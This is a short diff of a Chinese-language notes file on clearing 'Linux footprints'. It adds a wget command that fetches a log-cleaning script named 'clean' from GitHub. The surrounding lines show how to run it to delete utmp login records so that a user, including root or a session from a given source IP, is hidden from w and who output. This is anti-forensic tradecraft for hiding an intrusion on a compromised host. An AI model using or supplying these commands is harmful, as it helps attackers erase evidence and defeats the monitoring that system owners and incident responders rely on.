@@ -7,6 +7,8 @@ wget -c -N --no-check-certificate "https://raw.githubusercontent.com/sunlewuyou/
 
 
 2、Linux脚印
+
+wget -c https://raw.githubusercontent.com/sunlewuyou/SH/master/clean
 1. 删除utmp记录，将自己从w或者who输出中隐藏
 python clean --mode delete --type utmp --user root //删除用户为root的用户记录
 python clean --mode delete --type utmp --user root --host "58.47.251.255" //删除用户为root且登录来源host为58.47.251.255的用户记录
